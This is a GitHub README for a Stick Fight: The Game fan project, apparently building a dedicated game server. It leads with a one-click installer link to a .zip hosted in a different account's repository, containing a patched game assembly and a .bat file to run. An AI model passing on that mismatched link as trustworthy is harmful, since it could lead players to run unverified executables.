---
repo: "milescoviello/sf-multiplayer"
name: "sf-multiplayer"
description: "Centralized dedicated-server revival for Stick Fight: The Game — v26 protocol, server-side physics, comp-scene focused. Forked from upstream StickFightDev."
readmeQualityOk: true
url: "https://github.com/milescoviello/sf-multiplayer"
language: "C#"
languages: ["C#", "Go"]
languagePcts: [65, 21]
stars: 5
forks: 0
openIssues: 5
closedIssues: 0
watchers: 2
contributors: 4
recentReleases: 0
createdAt: "2026-05-22T05:42:08Z"
lastCommitAt: "2026-11-09T12:01:19Z"
status: "thriving"
tags: ["solo_builder", "hidden_gem"]
healthScore: 69
undervaluedScore: 18
maintainers: ["milescoviello", "claude"]
openGraphImageUrl: "https://opengraph.githubassets.com/ee518e8a46b8e7cb6b0598de3ca8e593b98cdf86819cbf312bebdc9fd37701a8/milescoviello/sf-multiplayer"
---

## Try it: [sf-multiplayer 1-Click Installer (.zip)](https://github.com/kitslayer/sf-multiplayer/raw/main/sf-multiplayer-StickFight-Installer.zip)

Self-contained — BepInEx, the client plugins and the patched `Assembly-CSharp` are all inside.
Unzip → run **`INSTALL-sf-multiplayer.bat`** → launch Stick Fight. That's it.

`SFClientRecon 0.6.2` · `SFServerBrowser 0.5.4` · native uGUI lobby (**F2**) · server-synced crates

Something not working? See [Install troubleshooting](#install-troubleshooting).

---

# sf-multiplayer — Stick Fight: The Game dedicated server

**A community project** to kill **Stick Fight's peer-to-peer host model** and replace it with a real **dedicated, server-authoritative** backend — so matches stop rubber-banding, surviving a host's connection drop, and showing each player a different physics simulation.

In stock Stick Fight one of the players *is* the host: their PC runs the match, everyone else relays through them, and if they lag or leave, the lobby dies and the simulation diverges. **sf-multiplayer removes that.** A headless copy of the game runs the match on a dedicated server (the "oracle"); every player is just a client. The result is lower,…
